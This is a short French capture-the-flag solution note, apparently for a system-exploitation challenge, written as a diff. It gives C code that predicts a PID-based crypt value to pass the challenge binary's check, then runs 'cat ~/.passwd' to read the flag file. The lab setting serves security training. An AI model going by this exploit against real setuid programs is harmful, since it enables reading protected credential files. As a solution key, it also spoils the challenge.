@@ -1,0 +1,15 @@
+creation d'un fichier test.c dans /tmp/bcrespin/
+
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int ac, char **av, char **env)
+{
+	char pid[16];
+	snprintf(pid,sizeof(pid), "%i", getpid());
+	execl("/challenge/app-systeme/ch4/ch4", "ch4", crypt(pid, "$1$awesome"), NULL);
+	return (0);
+}
+
+on compile et on execute, puis cat ~/.passwd
